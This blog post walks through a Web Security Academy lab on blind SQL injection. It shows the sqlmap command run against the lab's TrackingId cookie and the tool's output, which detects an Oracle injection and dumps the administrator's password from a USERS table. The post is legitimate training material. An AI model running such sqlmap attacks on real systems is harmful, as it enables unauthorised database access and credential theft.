---
layout: post
title:  "Blind SQL injection with conditional errors"
date:   2024-09-22 09:39:54 +0530
---

## Objective 

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

## Solution 

Like the previous lab, This is same way to exploit through a cookie value where the `TrackingId` is vulnerable to SQLi and It uses an `Oracle` database 

```sh
 ✘ nits@FWS-CHE-LT-8869  ~/Workspace/Personal/blog   main  sqlmap -u "https://0a6b00b104f31bcf80063aa500500058.web-security-academy.net/filter?category=Pets" --cookie "TrackingId=4HWFjkvkQS0pdMwd; session=E5Vnrbwa0Xd09dJur4uOtXLo7VR2w65i" -p "TrackingId" --level 2 --threads 5
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.9#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:36:24 /2024-09-22/

[11:36:24] [INFO] testing connection to the target URL
[11:36:25] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[11:36:31] [INFO] target URL content is stable
do you want to URL encode cookie values (implementation specific)? [Y/n] n
[11:36:34] [WARNING] heuristic (basic) test shows that Cookie parameter 'TrackingId' might not be injectable
[11:36:35] [INFO] testing for SQL injection on Cookie parameter 'TrackingId'
[11:36:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:37:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:37:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[11:37:24] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[11:37:49] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[11:38:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[11:38:14] [INFO] Cookie parameter 'TrackingId' appears to be 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' injectable (with --code=200)
```

While dumping the database, we found `administrator` credentials 

```sh
[11:48:19] [INFO] fetching entries for table 'USERS' in database 'PETER'
[11:48:19] [INFO] fetching number of entries for table 'USERS' in database 'PETER'
[11:48:19] [INFO] retrieved: 3
[11:48:23] [INFO] retrieving the length of query output
[11:48:23] [INFO] retrieved: 
[11:48:25] [INFO] retrieved:  
[11:48:36] [INFO] retrieving the length of query output
[11:48:36] [INFO] retrieved: 20
[11:49:03] [INFO] retrieved: p2vmu5h7blpqnvt10fs8             
[11:49:03] [INFO] retrieving the length of query output
[11:49:03] [INFO] retrieved: 13
[11:49:23] [INFO] retrieved: administrator             
[11:49:23] [INFO] retrieving the length of query output
```

Now login with those credentials and lab is solved 

![]({{ site.baseurl }}/assets/images/sqli50.png)